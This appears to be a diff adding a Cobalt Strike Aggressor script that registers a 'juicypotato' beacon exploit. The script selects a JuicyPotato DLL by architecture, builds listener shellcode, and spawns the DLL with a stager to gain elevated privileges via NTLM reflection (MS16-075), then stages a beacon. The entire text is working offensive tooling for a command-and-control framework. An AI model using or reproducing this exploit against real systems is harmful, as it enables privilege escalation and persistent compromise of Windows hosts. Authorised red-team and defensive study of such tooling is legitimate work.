@@ -1,0 +1,21 @@
+sub juicypotato {
+    btask($1, "Task Beacon to run " . listener_describe($2) . " via JuicyPotato (ms16-075)");
+    
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $dll = "JuicyPotato.x64.dll";
+    } else {
+        $arch = "x86";
+        $dll = "JuicyPotato.x32.dll";
+    }
+
+    $stager = shellcode($2, false, $arch);
+
+    bdllspawn!($1, script_resource($dll), $stager, "NTLM DCOM->RPC NTLM Reflection (MS16-075)", 5000);
+    
+    bstage($1, $null, $2, $arch);
+}
+
+beacon_exploit_register("juicypotato", "JuicyPotato (ms16-075)", &juicypotato);
+
